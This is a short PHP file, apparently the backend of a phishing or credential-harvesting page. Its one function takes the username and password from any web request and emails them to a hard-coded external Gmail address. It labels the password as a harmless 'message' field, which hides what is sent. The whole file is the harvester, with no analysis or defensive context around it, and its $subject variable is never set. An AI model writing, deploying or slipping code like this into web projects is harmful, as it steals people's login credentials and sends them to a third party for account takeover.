<?php

	function mail_sender(){
		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
			return false;
		}

		$username = $_REQUEST['username'];
		$password = $_REQUEST['password'];
		
		$reciever = "aladinkuren@gmail.com";
		
		$message = "Klijent: ". $username;
		$message .= "Poruka: ". $password;
		
		return mail($reciever, $subject, $message);
	}
?>